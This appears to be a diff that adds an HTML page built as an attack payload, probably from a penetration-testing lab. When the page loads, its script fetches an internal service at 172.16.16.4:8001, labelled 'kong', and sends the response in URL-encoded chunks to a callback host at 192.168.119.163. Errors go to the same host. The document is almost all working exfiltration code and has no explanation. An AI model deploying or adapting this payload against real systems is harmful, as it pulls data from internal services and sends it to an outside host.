@@ -1,0 +1,49 @@
+<html>
+<head>
+<script>
+function runscript() {
+    exfiltrate();
+    //fetch("http://192.168.119.163/itworked");
+}
+function exfiltrate() {
+    fetch("http://172.16.16.4:8001") // kong
+    .then((response) => response.text())
+    .then((data) => {
+      let size = 1024;
+    	if(data.length > size) {
+    	  const chunked_data = chunkSubstr(data, size);
+    	  for(let i = 0; i < chunked_data.length; ++i) {
+    	     fetch("http://192.168.119.163/callback?" + encodeURIComponent(chunked_data[i]));
+        }
+      }
+      else {
+        fetch("http://192.168.119.163/callback?" + encodeURIComponent(data));
+      }
+    }).catch(err => {
+        fetch("http://192.168.119.163/error?" + encodeURIComponent(err));
+    }); 
+}
+function chunkSubstr(str, size) {
+  const numChunks = Math.ceil(str.length / size)
+  const chunks = new Array(numChunks)
+
+  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
+    chunks[i] = str.substr(o, size)
+  }
+
+  return chunks
+}
+function truncate(str, n){
+  return (str.length > n) ? str.slice(0, n-1) + '&hellip;' : str;
+};
+function truncate1( str, n, useWordBoundary ){
+  if (str.length <= n) { return str; }
+  const subString = str.slice(0, n-1); // the original check
+  return (useWordBoundary ? subString.slice(0, subString.lastIndexOf(" ")) : subString) + "&hellip;";
+};
+</script>
+</head>
+<body onload='runscript()'>
+<div></div>
+</body>
+</html>
